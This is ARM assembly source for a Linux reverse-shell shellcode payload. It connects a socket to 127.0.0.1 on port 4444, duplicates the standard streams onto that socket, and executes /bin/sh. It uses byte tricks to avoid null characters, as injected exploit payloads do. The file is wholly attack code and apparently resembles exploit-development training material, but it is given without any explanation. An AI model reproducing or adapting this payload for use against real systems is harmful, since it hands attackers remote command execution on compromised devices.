.section .text
.global _start
_start:
 .ARM
 add   r3, pc, #1       // switch to thumb mode 
 bx    r3

.THUMB
// socket(2, 1, 0) 
 mov   r0, #2
 mov   r1, #1
 sub   r2, r2
 mov   r7, #200
 add   r7, #81         // r7 = 281 (socket) 
 svc   #1              // r0 = resultant sockfd 
 mov   r4, r0          // save sockfd in r4 

// connect(r0, &sockaddr, 16) 
 adr   r1, struct        // pointer to address, port 
 strb  r2, [r1, #1]    // write 0 for AF_INET 
 mov   r2, #16
 add   r7, #2          // r7 = 283 (connect) 
 svc   #1

// dup2(sockfd, 0) 
 mov   r7, #63         // r7 = 63 (dup2) 
 mov   r0, r4          // r4 is the saved sockfd 
 sub   r1, r1          // r1 = 0 (stdin) 
 svc   #1
// dup2(sockfd, 1) 
 mov   r0, r4          // r4 is the saved sockfd 
 mov   r1, #1          // r1 = 1 (stdout) 
 svc   #1
// dup2(sockfd, 2) 
 mov   r0, r4         // r4 is the saved sockfd 
 mov   r1, #2         // r1 = 2 (stderr)
 svc   #1

// execve("/bin/sh", 0, 0) 
 adr   r0, binsh
 sub   r2, r2
 sub   r1, r1
 strb  r2, [r0, #7]
 mov   r7, #11       // r7 = 11 (execve) 
 svc   #1

struct:
.ascii "\x02\xff"      // AF_INET 0xff will be NULLed 
.ascii "\x11\x5c"      // port number 4444 
.byte 127,0,0,1  // IP Address 
binsh:
.ascii "/bin/shX"

